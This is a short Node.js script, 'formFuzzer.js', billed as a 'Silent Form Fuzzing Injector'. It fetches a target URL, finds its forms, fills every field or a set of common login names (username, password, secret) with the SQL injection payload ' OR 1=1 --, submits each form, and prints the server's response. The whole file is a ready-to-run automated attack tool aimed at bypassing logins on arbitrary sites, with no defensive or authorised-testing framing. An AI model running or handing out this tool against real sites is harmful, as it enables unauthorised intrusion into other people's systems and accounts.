// formFuzzer.js - Silent Form Fuzzing Injector
const axios = require('axios');
const jsdom = require('jsdom');
const { JSDOM } = jsdom;

const commonFields = ['username', 'user', 'email', 'login', 'password', 'pass', 'pwd', 'secret'];
const payload = "' OR 1=1 --";

async function fuzzForm(url) {
  console.log(`[FORM FUZZER] Scanning ${url} for forms...`);
  try {
    const res = await axios.get(url);
    const dom = new JSDOM(res.data);
    const forms = dom.window.document.querySelectorAll('form');

    if (forms.length === 0) {
      console.log("❌ No form found.");
      return;
    }

    for (let form of forms) {
      const action = form.getAttribute('action') || url;
      const method = (form.getAttribute('method') || 'GET').toUpperCase();
      const inputs = form.querySelectorAll('input[name]');
      let data = {};

      inputs.forEach(input => {
        const name = input.getAttribute('name');
        data[name] = payload;
      });

      // If no inputs, try common fields
      if (Object.keys(data).length === 0) {
        commonFields.forEach(field => data[field] = payload);
      }

      const fullUrl = action.startsWith('http') ? action : new URL(action, url).href;
      console.log(`➡️ Trying ${method} ${fullUrl} with payload`);

      try {
        const result = method === 'POST'
          ? await axios.post(fullUrl, data)
          : await axios.get(fullUrl, { params: data });

        console.log(`[RESULT] Status: ${result.status}`);
        console.log(`[BODY] ${result.data.slice(0, 200)}...`);
      } catch (e) {
        console.log(`[ERROR] Injection failed: ${e.message}`);
      }
    }
  } catch (e) {
    console.error(`[ERROR] Failed to fetch page: ${e.message}`);
  }
}

const target = process.argv[2];
if (!target) {
  console.error("❌ Provide a URL to scan.");
  process.exit(1);
}

fuzzForm(target);
